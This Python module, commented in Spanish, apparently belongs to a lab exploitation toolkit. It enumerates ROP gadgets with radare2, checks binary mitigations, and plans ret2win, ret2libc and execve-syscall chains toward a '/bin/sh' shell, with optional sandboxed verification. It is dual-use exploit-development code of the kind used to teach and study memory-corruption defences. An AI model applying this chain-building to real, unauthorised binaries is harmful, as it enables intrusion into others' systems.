"""Exploit Chain Analyzer: analiza el binario del laboratorio y representa las cadenas de
explotacion potenciales, desde la vulnerabilidad inicial hasta el objetivo de ejecucion.

Todo el analisis es GROUNDED en el binario cargado:
- primitivas a partir de checksec + sinks (control de RIP por overflow, pivote de RSP);
- gadgets reales enumerados con radare2 (`/Rj`), clasificados por registros que fijan, registros
  que destruyen (clobber), stack delta y efectos secundarios;
- cadenas candidatas (ret2win / ret2libc system / execve por syscall) con sus requisitos, y
  deteccion automatica de cadenas INCOMPATIBLES con la explicacion de por que fallan;
- puntuacion TECNICA (propiedades objetivas: numero de gadgets, requisitos incumplidos,
  mitigaciones que bloquean, conflictos de clobber). No es una recomendacion para atacar.

La simulacion/verificacion real (opcional, verify=True) reutiliza el sandbox de autopoc/autorop
(--network none). Todo queda restringido al binario y entorno de laboratorio cargados por el usuario.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import List, Optional

# registros de argumentos SysV x86-64 (orden de llamada) + los relevantes para syscalls
_ARG_REGS = ["rdi", "rsi", "rdx", "rcx", "r8", "r9"]
_SYS_EXECVE = 0x3b

# tipos de opcode que rompen un gadget limpio si aparecen antes del terminador
_BRANCHY = {"cjmp", "jmp", "ujmp", "call", "ucall", "rcall", "ccall", "invalid", "ill"}
# tipos que solo mueven datos sin efecto colateral sorpresa
_BENIGN = {"pop", "ret", "nop", "mov", "syscall", "leave", "xor", "push"}


@dataclass
class Gadget:
    addr: int = 0
    insns: List[str] = field(default_factory=list)
    sets: List[str] = field(default_factory=list)       # regs cargados desde el stack (pop reg)
    clobbers: List[str] = field(default_factory=list)   # otros regs escritos
    stack_delta: int = 0                                 # bytes que consume del stack (incl. ret)
    kind: str = "other"                                  # pop|syscall|pivot|ret|write|other
    side_effects: str = ""

    @property
    def text(self) -> str:
        return "; ".join(self.insns)


@dataclass
class ChainStep:
    kind: str = "gadget"       # vuln|primitive|control|gadget|target
    label: str = ""
    detail: str = ""
    addr: Optional[int] = None
    regs: dict = field(default_factory=dict)   # estado de registros que la cadena FIJA tras el paso
    stack: str = ""
    constraints: str = ""


@dataclass
class ExploitChain:
    name: str = ""
    target: str = ""
    steps: List[ChainStep] = field(default_factory=list)
    requirements: List[str] = field(default_factory=list)
    regs_needed: List[str] = field(default_factory=list)
    gadgets_used: List[int] = field(default_factory=list)
    constraints: List[str] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)
    break_points: List[str] = field(default_factory=list)
    feasible: bool = False
    score: int = 0
    score_detail: dict = field(default_factory=dict)
    sim_result: str = "no simulada"


@dataclass
class ChainAnalysis:
    arch: str = "x86_64"
    primitives: List[str] = field(default_factory=list)
    control: dict = field(default_factory=dict)   # {RIP, RSP_pivot, regs:[...]}
    target: str = ""
    gadgets: List[Gadget] = field(default_factory=list)
    chains: List[ExploitChain] = field(default_factory=list)
    graph: dict = field(default_factory=dict)
    note: str = ""

    @property
    def ok(self) -> bool:
        return bool(self.chains)


def _classify(raw: dict) -> Optional[Gadget]:
    """Convierte un gadget crudo de r2 (/Rj) en un Gadget clasificado. Devuelve None si no es
    utilizable (ramas/llamadas intermedias o terminador no valido)."""
    ops = raw.get("opcodes", [])
    if not ops:
        return None
    last = ops[-1]
    lt = last.get("type", "")
    if lt not in ("ret", "syscall") and "ret" not in last.get("opcode", ""):
        return None
    sets, clobbers, side = [], [], []
    stack_delta = 8 if lt == "ret" else 0   # el ret consume la direccion de retorno
    for op in ops[:-1]:
        t = op.get("type", "")
        txt = (op.get("opcode", "") or "").strip()
        if t in _BRANCHY:
            return None                      # gadget sucio: no utilizable
        parts = txt.replace(",", " ").split()
        mn = parts[0] if parts else ""
        if mn == "pop" and len(parts) >= 2:
            reg = parts[1]
            sets.append(reg)
            stack_delta += 8
        elif mn == "add" and len(parts) >= 3 and parts[1] == "rsp":
            try:
                stack_delta += int(parts[2], 0)
            except ValueError:
                pass
            side.append(txt)
        elif mn in ("mov", "xor", "lea") and len(parts) >= 2:
            clobbers.append(parts[1])
        elif mn == "leave":
            side.append("leave (rsp<-rbp; pop rbp): pivote de stack")
        elif t not in _BENIGN:
            side.append(txt)
    kind = "ret"
    joined = " ".join((o.get("opcode", "") or "") for o in ops)
    if "syscall" in joined:
        kind = "syscall"
    elif "leave" in joined or any("pop rsp" in (o.get("opcode", "") or "") for o in ops):
        kind = "pivot"
    elif sets:
        kind = "pop"
    elif any(o.get("opcode", "").startswith("mov ") and "[" in o.get("opcode", "") for o in ops):
        kind = "write"
    return Gadget(addr=raw.get("retaddr", ops[0].get("addr", 0)),
                  insns=[o.get("opcode", "") for o in ops],
                  sets=sets, clobbers=[c for c in clobbers if c not in sets],
                  stack_delta=stack_delta, kind=kind, side_effects="; ".join(side))


def _best_for(gadgets: List[Gadget], reg: str) -> Optional[Gadget]:
    """El mejor gadget para fijar `reg`: el que hace `pop reg` con menos ruido (menos clobber,
    menor stack delta, sin efectos secundarios)."""
    cands = [g for g in gadgets if reg in g.sets]
    if not cands:
        return None
    return sorted(cands, key=lambda g: (len(g.clobbers), bool(g.side_effects), g.stack_delta,
                                        len(g.sets)))[0]


def _enum_gadgets(binary: str) -> List[Gadget]:
    """Enumera y clasifica gadgets reales del binario con radare2 (`/Rj`). Busca patrones utiles
    para control de registros de argumentos, syscall y pivote. Best-effort; [] si no hay r2."""
    out: List[Gadget] = []
    seen = set()
    try:
        import json
        import r2pipe
        r = r2pipe.open(binary, flags=["-2"]); r.cmd("aaa")
        patterns = (["pop " + reg for reg in _ARG_REGS + ["rax", "rbx", "rbp", "rsp"]]
                    + ["syscall", "leave", "int 0x80"])
        for pat in patterns:
            try:
                raws = json.loads(r.cmd(f"/Rj {pat}") or "[]")
            except Exception:
                raws = []
            for raw in raws[:40]:
                g = _classify(raw)
                if g and g.addr not in seen:
                    seen.add(g.addr)
                    out.append(g)
        r.quit()
    except Exception:
        return out
    return out


def _facts(binary: str, reg) -> dict:
    """Hechos del binario: mitigaciones, win(), system(), /bin/sh, offset de control de RIP.
    Usa el registro de oraculos si se pasa; si no, r2 directo."""
    f = {"canary": None, "pie": None, "nx": None, "arch": "x86_64",
         "win": None, "system": None, "binsh": None, "rip_offset": None}
    try:
        import json
        import r2pipe
        r = r2pipe.open(binary, flags=["-2"]); r.cmd("aaa")
        info = json.loads(r.cmd("ij") or "{}").get("bin", {})
        f["canary"] = info.get("canary")
        f["pie"] = info.get("pic")
        f["nx"] = info.get("nx")
        f["arch"] = f"{info.get('arch','x86')}_{info.get('bits',64)}"
        for fn in json.loads(r.cmd("aflj") or "[]"):
            nm = fn.get("name", "").lower()
            if f["win"] is None and ("win" in nm or "shell" in nm or "backdoor" in nm or "giveshell" in nm):
                f["win"] = fn.get("offset")
            if f["system"] is None and nm.endswith("system"):
                f["system"] = fn.get("offset")
        # /bin/sh en strings
        for s in json.loads(r.cmd("izzj") or "{}").get("strings", []):
            if "/bin/sh" in (s.get("string", "") or ""):
                f["binsh"] = s.get("vaddr"); break
        r.quit()
    except Exception:
        pass
    # offset de control de RIP (reutiliza el detector estatico de autopoc)
    try:
        from .autopoc import _static_offset, find_win
        f["rip_offset"] = _static_offset(binary)
        if f["win"] is None:
            f["win"] = find_win(binary)
    except Exception:
        pass
    return f


def _score(chain: ExploitChain) -> None:
    """Puntuacion TECNICA (0-100) por propiedades objetivas. No es recomendacion de ataque."""
    unmet = sum(1 for r in chain.requirements if r.startswith("[FALTA]"))
    blockers = len(chain.break_points)
    ng = len(chain.gadgets_used)
    conflicts = sum(1 for c in chain.constraints if "conflicto" in c.lower())
    s = 100 - 8 * ng - 25 * unmet - 12 * blockers - 6 * conflicts
    chain.score = max(0, min(100, s))
    chain.score_detail = {"gadgets": ng, "requisitos_incumplidos": unmet,
                          "puntos_de_rotura": blockers, "conflictos_clobber": conflicts}
    chain.feasible = (unmet == 0 and blockers == 0)


def _mitig_breakpoints(f: dict, uses_fixed_addr: bool) -> (List[str], List[str]):
    """Mitigaciones relevantes y puntos de rotura que introducen para una cadena de overflow."""
    mit, brk = [], []
    if f.get("canary") is True:
        mit.append("Stack canary ACTIVO")
        brk.append("Canary activo: el overflow lineal se detecta antes de retornar; la cadena se "
                   "rompe salvo que exista una fuga del canary.")
    if f.get("pie") is True and uses_fixed_addr:
        mit.append("PIE ACTIVO")
        brk.append("PIE activo: las direcciones (win/gadgets/system/'/bin/sh') son aleatorias; la "
                   "cadena se rompe sin una fuga de direccion (leak).")
    if f.get("nx") is True:
        mit.append("NX ACTIVO (no shellcode; la via es ROP)")
    return mit, brk


def analyze_chains(binary: str, reg=None, verify: bool = False) -> ChainAnalysis:
    f = _facts(binary, reg)
    gadgets = _enum_gadgets(binary)
    an = ChainAnalysis(arch=f["arch"], gadgets=gadgets)

    # --- primitivas y control ---
    rip = f.get("rip_offset") is not None or f.get("win") is not None
    reg_control = sorted({r for g in gadgets for r in g.sets})
    pivot = any(g.kind == "pivot" for g in gadgets)
    if rip:
        an.primitives.append("Control de RIP por desbordamiento de pila (offset "
                             + (str(f["rip_offset"]) if f.get("rip_offset") is not None else "por determinar") + ")")
    if reg_control:
        an.primitives.append("Control de registros via gadgets pop: " + ", ".join(reg_control))
    if pivot:
        an.primitives.append("Pivote de RSP disponible (leave/pop rsp)")
    an.control = {"RIP": rip, "RSP_pivot": pivot, "regs": reg_control}
    an.target = ("execve('/bin/sh')" if (f.get("system") or f.get("binsh")) else
                 ("win()" if f.get("win") is not None else "control de flujo"))

    # --- construccion de cadenas candidatas ---
    chains: List[ExploitChain] = []

    # 1) ret2win: overflow -> win()
    if f.get("win") is not None or True:
        c = ExploitChain(name="ret2win", target="win()")
        has_win = f.get("win") is not None
        c.requirements = [
            ("[OK] " if rip else "[FALTA] ") + "control de RIP (offset de retorno)",
            ("[OK] " if has_win else "[FALTA] ") + "funcion objetivo win()/giveshell en el binario",
        ]
        c.regs_needed = []
        c.mitigations, c.break_points = _mitig_breakpoints(f, uses_fixed_addr=True)
        winaddr = f.get("win") or 0
        c.steps = [
            ChainStep("vuln", "Desbordamiento de pila", "Entrada sin acotar sobre buffer local",
                      stack="se sobrescribe hasta la direccion de retorno guardada"),
            ChainStep("primitive", "Control de RIP",
                      f"offset={f.get('rip_offset')}" if f.get("rip_offset") is not None else "offset por determinar",
                      regs={"rip": "controlado"}, stack="RIP = siguiente qword tras el offset"),
            ChainStep("target", "win()", f"salta a win() en {hex(winaddr)}" if has_win else "requiere win()",
                      addr=winaddr or None, regs={"rip": hex(winaddr) if has_win else "?"},
                      constraints="alinear el stack (16B) con un gadget `ret` si win() llama a system"),
        ]
        c.gadgets_used = []
        _score(c)
        if verify and c.feasible:
            c.sim_result = _simulate(binary, "ret2win")
        chains.append(c)

    # 2) ret2libc: overflow -> pop rdi; ret -> system('/bin/sh')
    if f.get("system") is not None or True:
        c = ExploitChain(name="ret2libc system", target="system('/bin/sh')")
        g_rdi = _best_for(gadgets, "rdi")
        has_sys = f.get("system") is not None
        has_binsh = f.get("binsh") is not None
        c.requirements = [
            ("[OK] " if rip else "[FALTA] ") + "control de RIP",
            ("[OK] " if g_rdi else "[FALTA] ") + "gadget `pop rdi; ret` (1er argumento)",
            ("[OK] " if has_sys else "[FALTA] ") + "system() en PLT/simbolos",
            ("[OK] " if has_binsh else "[FALTA] ") + "cadena '/bin/sh' en el binario",
        ]
        c.regs_needed = ["rdi"]
        c.mitigations, c.break_points = _mitig_breakpoints(f, uses_fixed_addr=True)
        if g_rdi:
            c.gadgets_used = [g_rdi.addr]
            if g_rdi.clobbers:
                c.constraints.append("posible conflicto de clobber: " + ", ".join(g_rdi.clobbers))
            if g_rdi.side_effects:
                c.constraints.append("efecto secundario del gadget rdi: " + g_rdi.side_effects)
        c.steps = [
            ChainStep("vuln", "Desbordamiento de pila", "controla la direccion de retorno"),
            ChainStep("primitive", "Control de RIP", regs={"rip": "controlado"}),
            ChainStep("gadget", "pop rdi; ret",
                      g_rdi.text if g_rdi else "AUSENTE",
                      addr=g_rdi.addr if g_rdi else None,
                      regs={"rdi": "&'/bin/sh'"} , stack=f"delta={g_rdi.stack_delta}B" if g_rdi else "",
                      constraints=(g_rdi.side_effects or "sin efectos secundarios") if g_rdi else "gadget ausente"),
            ChainStep("target", "system('/bin/sh')",
                      f"system en {hex(f['system'])}" if has_sys else "requiere system()",
                      addr=f.get("system"), regs={"rdi": "&'/bin/sh'"}),
        ]
        _score(c)
        if verify and c.feasible:
            c.sim_result = _simulate(binary, "ret2libc")
        chains.append(c)

    # 3) execve por syscall: pop rax=59; pop rdi=&/bin/sh; pop rsi=0; pop rdx=0; syscall
    c = ExploitChain(name="execve syscall", target="execve('/bin/sh',0,0)")
    need = {"rax": _best_for(gadgets, "rax"), "rdi": _best_for(gadgets, "rdi"),
            "rsi": _best_for(gadgets, "rsi"), "rdx": _best_for(gadgets, "rdx")}
    g_sys = next((g for g in gadgets if g.kind == "syscall"), None)
    has_binsh = f.get("binsh") is not None
    c.requirements = [("[OK] " if rip else "[FALTA] ") + "control de RIP"]
    for rname in ("rax", "rdi", "rsi", "rdx"):
        c.requirements.append(("[OK] " if need[rname] else "[FALTA] ") + f"gadget `pop {rname}; ret`")
    c.requirements.append(("[OK] " if g_sys else "[FALTA] ") + "gadget `syscall`")
    c.requirements.append(("[OK] " if has_binsh else "[FALTA] ") + "cadena '/bin/sh' (o escribible en .bss)")
    c.regs_needed = ["rax", "rdi", "rsi", "rdx"]
    c.mitigations, c.break_points = _mitig_breakpoints(f, uses_fixed_addr=True)
    c.gadgets_used = [g.addr for g in list(need.values()) + [g_sys] if g]
    for rname, g in need.items():
        if g and g.clobbers:
            other = [x for x in g.clobbers if x in c.regs_needed and x != rname]
            if other:
                c.constraints.append(f"conflicto de clobber en pop {rname}: destruye {', '.join(other)}")
    c.steps = [ChainStep("vuln", "Desbordamiento de pila"),
               ChainStep("primitive", "Control de RIP", regs={"rip": "controlado"})]
    vals = {"rax": "59 (execve)", "rdi": "&'/bin/sh'", "rsi": "0", "rdx": "0"}
    setregs = {}
    for rname in ("rax", "rdi", "rsi", "rdx"):
        g = need[rname]
        setregs = dict(setregs); setregs[rname] = vals[rname]
        c.steps.append(ChainStep("gadget", f"pop {rname}; ret", g.text if g else "AUSENTE",
                                 addr=g.addr if g else None, regs=dict(setregs),
                                 stack=f"delta={g.stack_delta}B" if g else "",
                                 constraints=(g.side_effects or "limpio") if g else "gadget ausente"))
    c.steps.append(ChainStep("target", "syscall -> execve", g_sys.text if g_sys else "syscall AUSENTE",
                             addr=g_sys.addr if g_sys else None, regs=dict(setregs)))
    _score(c)
    if verify and c.feasible:
        c.sim_result = _simulate(binary, "execve")
    chains.append(c)

    # orden: factibles primero, luego por puntuacion tecnica
    chains.sort(key=lambda x: (not x.feasible, -x.score))
    an.chains = chains
    an.graph = _build_graph(an)
    if not gadgets:
        an.note = "sin gadgets enumerados (binario pequeno/dinamico); el analisis se basa en primitivas."
    return an


def _build_graph(an: ChainAnalysis) -> dict:
    """Grafo del explorador: nodo por primitiva/gadget/estado, arista por transicion. Nodo raiz
    de vulnerabilidad compartido y nodo objetivo compartido por objetivo igual."""
    nodes, edges = [], []
    ids = {}

    def node(nid, label, kind, detail="", regs=None, stack="", constraints=""):
        if nid not in ids:
            ids[nid] = True
            nodes.append({"id": nid, "label": label, "kind": kind, "detail": detail,
                          "regs": regs or {}, "stack": stack, "constraints": constraints})
        return nid

    node("vuln", "Vulnerabilidad", "vuln", "Desbordamiento de pila / control de retorno")
    for ci, c in enumerate(an.chains):
        prev = "vuln"
        for si, st in enumerate(c.steps):
            if st.kind == "vuln":
                continue
            nid = f"c{ci}s{si}"
            lbl = st.label + ("" if st.kind != "gadget" or st.addr is None else f"\n{hex(st.addr)}")
            node(nid, lbl, st.kind, st.detail, st.regs, st.stack, st.constraints)
            ok = ("AUSENTE" not in (st.detail or "")) and ("ausente" not in (st.constraints or ""))
            edges.append({"src": prev, "dst": nid, "chain": ci, "ok": ok})
            prev = nid
    return {"nodes": nodes, "edges": edges}


def _simulate(binary: str, kind: str) -> str:
    """Simulacion/verificacion real en el sandbox (opcional). Reutiliza autopoc/autorop."""
    try:
        if kind == "ret2win":
            from .autopoc import autopoc
            r = autopoc(binary, run=True)
            return ("VERIFICADA (shell en sandbox)" if getattr(r, "verified", False)
                    else "construida; no verificada en sandbox")
        else:
            from .autopoc import autorop
            r = autorop(binary, run=True)
            if r.get("verified"):
                return f"VERIFICADA ({r.get('strategy','')}, offset={r.get('offset')})"
            return "no verificada: " + (r.get("note", "") or "")
    except Exception as e:
        return f"no simulada ({e.__class__.__name__})"
